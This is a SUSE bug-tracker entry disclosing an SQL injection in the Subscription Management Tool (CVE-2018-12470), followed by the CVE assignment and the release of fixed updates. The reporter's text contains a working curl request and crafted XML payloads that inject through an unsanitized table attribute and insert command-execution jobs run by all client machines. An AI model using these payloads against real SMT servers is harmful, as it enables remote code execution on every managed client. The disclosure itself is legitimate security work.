| [Description](show_bug.cgi?id=1103810#c0)  Andreas Stieger   2018-08-04 20:07:57 UTC  ``` EMBARGOED  reported by ebx@riseup.net via mail to security@suse.de  [...] current release (v3.0.32) of the Subscription Management Tool (<https://github.com/SUSE/smt>) [...] in the RegistrationSharing module   The second vulnerability is a SQL injection that can be found in the `_createInsertSQLfromXML` subroutine of the RegistrationSharing module. This routine takes in XML that has been processed with `_getXMLFromPostData` and creates a SQL statement to insert a new entry into the smt database (usually into the Clients and Registration tables). While attribute _values_ are "quoted" in an attempt to avoid SQLi, the tableName _attribute_ is not sanitized in any way and can be used as an injection point. (<https://github.com/SUSE/smt/blob/SMT12/www/perl-lib/SMT/RegistrationSharing.pm#L298>).  By issuing a POST request to the /regsvc endpoint with a specially crafted XML payload we can exploit this, here is a quick example just to demonstrate the injection:  curl -v -X POST -d @sqli.xml "http://<smt_url>/center/regsvc?command=shareregistration&lang=en-US&version=1.0"  sqli.xml:     <?xml version="1.0" encoding="ISO-8859-1"?>     <registrationData>         <tableData table='Clients (GUID) VALUES("random_value_because_why_not");--'>             <entry columnName="HOSTNAME" value="smt-client"/>         </tableData>     </registrationData>      the `table=''` attribute value is appended to an `INSERT INTO ` clause without any sanitization and the rest of the clause can be commented out. This originally did not seem all that interesting to me, but I realized that this can be used to insert entries into the `JobQueue` table and thus can be used to gain RCE!  The JobQueue table holds jobs that clients (automatically, by default) pull from the SMT server and execute. One of these job types is a simple "execute" and can be used to execute commands on the client machine. Here is an example payload (note that we could use SQLi to create the query, but since the code will just read any table name and use the values it's easier to structure it this way):  rce.xml:     <?xml version="1.0" encoding="ISO-8859-1"?>     <registrationData>         <tableData table='JobQueue'>             <entry columnName="GUID_ID" value="16"/>             <entry columnName="NAME" value="Code Execution"/>             <entry columnName="DESCRIPTION" value="Code Execution"/>             <entry columnName="TYPE" value="4"/>             <entry columnName="ARGUMENTS" value='&lt;arguments command="touch /tmp/x">&lt;options>&lt;command>touch /tmp/x&lt;/command>&lt;/options>&lt;/arguments>'/>         </tableData>     </registrationData>   In this example we just touch a file in /tmp but this could be used to create backdoors, get a shell or do virtually anything. An attacker could very easily create many entries for any possible existing GUID_ID's (or utilize the previous vulnerabilities to potentially read them) and gain code execution on _all_ client machines. ``` [Comment 5](show_bug.cgi?id=1103810#c5)  Marcus Meissner   2018-08-07 09:32:58 UTC  ``` I have assigned CVE-2018-12470. ``` [Comment 9](show_bug.cgi?id=1103810#c9)  Johannes Segitz   2018-08-16 15:27:31 UTC  ``` SUSE would like to thank Jake Miller for reporting these issues to us. ``` [Comment 11](show_bug.cgi?id=1103810#c11)  Johannes Segitz   2018-09-27 12:48:40 UTC  ``` updates released ``` [Comment 12](show_bug.cgi?id=1103810#c12)  Swamp Workflow Management   2018-09-27 16:11:10 UTC  ``` SUSE-SU-2018:2898-1: An update that solves three vulnerabilities and has 6 fixes is now available.
